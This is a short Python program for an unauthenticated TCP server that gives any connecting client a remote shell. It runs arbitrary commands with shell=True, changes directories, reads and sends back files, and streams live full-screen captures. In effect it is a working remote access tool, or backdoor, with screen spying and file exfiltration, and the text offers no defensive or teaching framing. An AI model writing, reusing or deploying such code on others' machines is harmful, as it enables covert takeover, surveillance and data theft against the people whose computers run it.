import socket
import os
import subprocess
from threading import Thread
from zlib import compress
from mss import mss

WIDTH = 1920
HEIGHT = 1080

def retrieve_screenshot(conn):
    with mss() as sct:
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while True:
            img = sct.grab(rect)
            pixels = compress(img.rgb, 6)

            size = len(pixels)
            conn.sendall(size.to_bytes(4, byteorder='big'))

            conn.sendall(pixels)

            if conn.recv(1024).decode().lower() == "quit share":
                break

def handle_client(conn):
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.lower().startswith("cd"):
            directory = command.split(" ", 1)[1]
            os.chdir(directory)
            current_directory = os.getcwd()
            conn.send(f"Server output: Changed directory to {current_directory}".encode())
        elif command.lower() == "share":
            retrieve_screenshot(conn)
        elif command.lower().startswith("get"):
            file_name = command.split(" ", 1)[1]
            if os.path.exists(file_name):
                conn.send("OK".encode())
                with open(file_name, "r") as file:
                    data = file.read()
                    conn.sendall(data.encode())
            else:
                conn.send("File not found".encode())
        else:
            output = execute_command(command)
            conn.send(f"Server output: {output}".encode())

    conn.close()

def execute_command(command):
    try:
        if command.lower() == "ls":
            return "\n".join(os.listdir())
        else:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
    except Exception as e:
        return str(e)

def main_server(host='192.168.1.7', port=12345):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print("Server listening on", host, "port", port)

    while True:
        conn, addr = server_socket.accept()
        print("Connected to", addr)

        client_handler = Thread(target=handle_client, args=(conn,))
        client_handler.start()

if __name__ == "__main__":
    main_server()
